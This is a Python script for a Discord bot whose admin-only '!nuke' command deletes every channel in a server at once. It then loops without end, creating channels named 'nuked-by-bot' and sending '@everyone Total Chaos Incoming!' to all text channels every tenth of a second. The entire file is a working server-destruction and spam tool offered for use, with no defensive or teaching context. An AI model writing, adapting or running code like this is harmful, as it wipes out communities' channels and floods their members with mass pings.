import discord
from discord.ext import commands
import asyncio
import time
import itertools # Used for alternating ping messages

# Define the bot's prefix and intents
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
# The content we will be spamming
SPAM_MESSAGE_CONTENT = "@everyone Total Chaos Incoming!"

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print(f'Bot is ready for full alternating spam! Use: !nuke')

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """Deletes all channels and starts concurrent creation and message spam loops."""
    if ctx.guild is None:
        await ctx.send('This command can only be used in a server.')
        return

    print(f'Nuke command received in {ctx.guild.name}.')
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    # --- Phase 1: Delete all existing channels concurrently ---
    deletion_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*deletion_tasks, return_exceptions=True)
    print(f'Attempted to delete all existing channels.')
    await asyncio.sleep(1) # Small pause for API consistency

    # --- Phase 2: Start two concurrent main tasks ---
    # 1. Create channels repeatedly (create_channels_task)
    # 2. Spam all available channels repeatedly (spam_existing_channels_task)

    # Use asyncio.gather to run both functions at the same time
    await asyncio.gather(
        create_channels_task(ctx.guild),
        spam_existing_channels_task(ctx.guild)
    )
    print("Nuke operation finished.") # This is only reached if a task breaks the loop

# --- Asynchronous function to continuously create channels ---
async def create_channels_task(guild):
    while True:
        try:
            timestamp = int(time.time())
            await guild.create_text_channel(name=f'nuked-by-bot-{timestamp}')
            # We don't sleep here, we create channels as fast as possible
        except discord.Forbidden:
            print('Create channel permissions missing. Stopping creation task.')
            break
        except Exception as e:
            print(f'Error in create task: {e}')

# --- Asynchronous function to continuously spam all *existing* channels ---
async def spam_existing_channels_task(guild):
    # Use an alternating list of messages to ensure unique content if needed
    messages = [f"{SPAM_MESSAGE_CONTENT} (Alt 1)", f"{SPAM_MESSAGE_CONTENT} (Alt 2)"]
    message_cycle = itertools.cycle(messages)

    while True:
        # Get a fresh list of all current text channels in the guild
        current_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]

        # Create a list of message sending tasks for ALL current channels
        send_tasks = []
        for channel in current_channels:
            content = next(message_cycle)
            send_tasks.append(channel.send(content))

        # Run all send tasks concurrently
        if send_tasks:
            await asyncio.gather(*send_tasks, return_exceptions=True)
            print(f'Sent messages to {len(send_tasks)} channels concurrently.')

        # A minimal sleep is required here for the loop to yield control and prevent CPU overuse
        await asyncio.sleep(0.1)

bot.run('enter your token')
